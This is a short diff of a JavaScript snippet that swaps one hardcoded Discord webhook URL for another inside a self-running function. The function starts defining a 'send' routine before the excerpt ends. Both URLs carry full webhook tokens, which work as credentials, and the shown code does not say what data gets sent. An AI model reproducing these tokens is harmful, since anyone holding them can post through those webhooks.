@@ -1,5 +1,5 @@
 (() => {
-  const WEBHOOK = 'https://discord.com/api/webhooks/1434614991432060968/VajxFHeGfgtIEUeV4nggqafz3Si0nuNKurVPz63JThFYHPWREkvvlHO5hvRbK2YXe-rH';
+  const WEBHOOK = 'https://discord.com/api/webhooks/1434605462711439422/Wk7iwG5fEWyftCam4dCgCtnX8vr2TluUPfBm-8WY7eYIjq1scW3ibDS9bLqaUhgQM5Ta';
 
   const send = async (data) => {
     const embed = {
